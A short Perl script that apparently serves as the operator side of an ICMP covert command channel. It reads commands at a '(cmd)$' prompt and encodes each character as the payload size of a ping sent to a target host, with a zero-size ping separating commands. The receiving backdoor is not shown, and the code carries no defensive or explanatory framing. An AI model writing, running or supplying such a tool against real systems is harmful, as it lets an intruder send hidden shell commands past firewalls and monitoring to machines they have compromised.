#!/usr/bin/perl
#
use strict;
no warnings 'deprecated';
use Carp;
use Getopt::Std;

$main::VERSION = 0.1;

use Data::Dumper;

BEGIN {
    eval { require Net::Ping; };
    if ($@) {
        die "Error: Net::Ping package is required. ".
            "Use cpan to install the package.";
        #die $@;
    }
};

require Net::Ping;
my $icmpv = "icmp";
my $ipv = "ipv4";

sub gen_sizes($) {
    my $cmd = shift;
    return undef unless (defined $cmd and $cmd !~ m/^$/ig);

    my @ret;
    for (split //, $cmd) {
        push @ret, ord;
    }
    return(@ret);
}

sub send_ping($$$) {
    my $data = shift;
    my $host = shift;
    my $dev = shift;
    return undef unless (defined $data
            or defined $host
            or defined $dev);
    my $ping_t = Net::Ping->new({
                proto   => $icmpv,
                family  => $ipv
            });
    $ping_t->{device} = $dev;
    $ping_t->{data_size} = $data;
    if (!$ping_t->ping($host, 3 ,$ipv)) {
        print STDERR "-Error pinging $host with data.\n";
        return undef;
    }
    
    use Time::HiRes qw(usleep);
    usleep(500);
    return $ping_t->close();
}

sub HELP_MESSAGE() {
    printf STDERR <<EOH, $0;
%s [-i interface] [-h host/addr]
EOH
    exit 2;
}

my %opts;
Getopt::Std::version_mess(undef) and HELP_MESSAGE() if ($#ARGV < 0);
getopts("i:h:", \%opts);

if (!exists $opts{i} or !defined $opts{i}) {
    croak "Interface must be specified.";
}
if (!exists $opts{h} or !defined $opts{h}) {
    croak "Hostname/address must be specified.";
}

if ($opts{h} =~ /:/) {
    printf STDERR "[i] Using IPv6 ICMP.\n";
    $icmpv = "icmpv6";
    $ipv = "ipv6";
}

goto PRINT_CMD;
while(<>) {
    if (defined) {
        chomp;
        exit 0 if (/^(?:q|quit|exit)$/i);
        
        my @chars = gen_sizes($_);
        printf STDERR "-Error: gen_sizes(cmd) returned undef." if ($#chars < 0);

        foreach (@chars) {
            send_ping($_, $opts{h}, $opts{i});
        }
        send_ping(0, $opts{h}, $opts{i}); #send NULL as a division of cmds
    }

    PRINT_CMD: print "(cmd)\$ ";
}

exit 0;
__END__

